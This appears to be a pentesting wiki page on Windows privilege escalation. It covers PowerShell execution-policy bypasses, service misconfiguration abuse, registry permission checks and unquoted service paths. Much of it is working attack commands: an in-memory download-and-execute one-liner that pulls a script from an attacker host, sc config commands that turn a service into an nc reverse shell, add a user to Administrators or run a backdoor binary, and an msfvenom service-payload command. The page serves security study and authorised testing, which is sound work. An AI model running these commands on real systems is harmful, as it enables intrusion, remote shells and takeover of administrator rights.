# Privilege Escalation

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

## Privilege Escalation

### Script Execution Policy Bypass Methods

<table>
  <thead>
    <tr>
      <th style="text-align:left">Bypass Method</th>
      <th style="text-align:left">Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left"><code>Set-Executionpolicy unrestricted</code>
      </td>
      <td style="text-align:left">Administrator rights are required.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>Set-ExecutionPolicy -Scope CurrentUser Unrestricted</code>
      </td>
      <td style="text-align:left">Only works in the context of the current user, but requires no Administrator
        rights.</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <ol>
          <li>Open .ps1 file in text editor.</li>
          <li>Copy all text in the file</li>
          <li>Paste into PowerShell</li>
        </ol>
      </td>
      <td style="text-align:left">PowerShell will run each line of the script one at a time, essentially
        the same as running the script.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>function &lt;name&gt; { &lt;code_here&gt; }</code>
      </td>
      <td style="text-align:left">Similar to the above example, however you paste your code inside the curly
        braces, and run the code by typing the <code>&lt;name&gt;</code> of your
        function. Allows for <b>code reuse without having to copy and paste multiple times.</b>
      </td>
    </tr>
    <tr>
      <td style="text-align:left"><code>cat &lt;C:\script.ps1&gt; | IEX</code>
      </td>
      <td style="text-align:left">Pipes the output of the script to the <code>Invoke-Expression</code> cmdlet,
        which runs any specified string as a command and returns the results to
        the console. <code>IEX</code> is an alias for <code>Invoke-Expression</code>.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>IEX { &lt;code_here&gt; }</code>
      </td>
      <td style="text-align:left">Essentially creates a one-time use function from your code.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>&amp; { &lt;code_here&gt; }</code>
      </td>
      <td style="text-align:left">The operator (<code>&amp;</code>) is an alias for <code>Invoke-Expression</code> and
        is equivelent to the example above.</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p><code>$text = Get-Content C:\temp\AnyFile.txt -Raw</code>
        </p>
        <p><code>$script = [System.Management.Automation.ScriptBlock]::Create($text)</code>
        </p>
        <p>&lt;code&gt;&lt;/code&gt;</p>
        <p><code>&amp; $script</code>
        </p>
      </td>
      <td style="text-align:left">Using the .NET object <code>System.Management.Automation.ScriptBlock</code> we
        can compile and text content to a script block. Then, using (<code>&amp;</code>)
        we can easily execute this compiled and formatted text file.</td>
    </tr>
    <tr>
      <td style="text-align:left"><code>Echo IEX(New-Object Net.WebClient).DownloadString(http://&lt;ip:port/filename.ps1&gt;) | PowerShell -NoProfile -</code>
      </td>
      <td style="text-align:left">Download script from attacker&apos;s machine, then run in PowerShell,
        in memory. No files are written to disk.</td>
    </tr>
  </tbody>
</table>

## Services

#### Modify service binary path \(_link to persistence pages_\)

If one of the groups you have access to has SERVICE\_ALL\_ACCESS in a service, then it can modify the binary that is being executed by the service. To modify it and execute nc you can do:

```text
sc config <service_Name> binpath= "C:\nc.exe -nv <IP> <port> -e C:\WINDOWS\System32\cmd.exe"
//use SYSTEM privileged service to add your user to administrators group
sc config <service_Name> binpath= "net localgroup administrators <username> /add"
//replace executable with your own binary (best to only do this for unused services!)
sc config <service_name> binpath= "C:\path\to\backdoor.exe"
```

#### Service Permissions \(_link to persistence pages_\)

Other Permissions can be used to escalate privileges: SERVICE\_CHANGE\_CONFIG Can reconfigure the service binary WRITE\_DAC: Can reconfigure permissions, leading to SERVICE\_CHANGE\_CONFIG WRITE\_OWNER: Can become owner, reconfigure permissions GENERIC\_WRITE: Inherits SERVICE\_CHANGE\_CONFIG GENERIC\_ALL: Inherits SERVICE\_CHANGE\_CONFIG To detect and exploit this vulnerability you can use exploit/windows/local/service\_permissions

Check if you can modify the binary that is executed by a service. You can get every binary that is executed by a service using wmic \(not in system32\) and check your permissions using icacls:

```text
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

You can also use sc and icacls:

```text
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

#### Services registry permissions \(_link to persistence pages_\)

You should check if you can modify any service registry. You can check your permissions over a service registry doing:

```text
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Check if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl. In that case you can change the binary that is going to be executed by the service. To change the Path of the binary executed: `reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f`

#### Unquoted Service Paths \(_link to persistence pages_\)

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space. For example, for the path C:\Program Files\Some Folder\Service.exe Windows will try to execute:

```text
C:\Program.exe 
C:\Program Files\Some.exe 
C:\Program Files\Some Folder\Service.exe
```

To list all unquoted service paths \(minus built-in Windows services\)

```text
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services
```

-or-

```text
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
    for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
        echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
    )
)
```

-also-

```text
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

You can detect and exploit this vulnerability with metasploit: `exploit/windows/local/trusted_service_path` You can manually create a service binary with msfvenom: `msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe`

### References

* [http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled](http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled) - [@KunalAdapi](https://twitter.com/kunalUdapi)

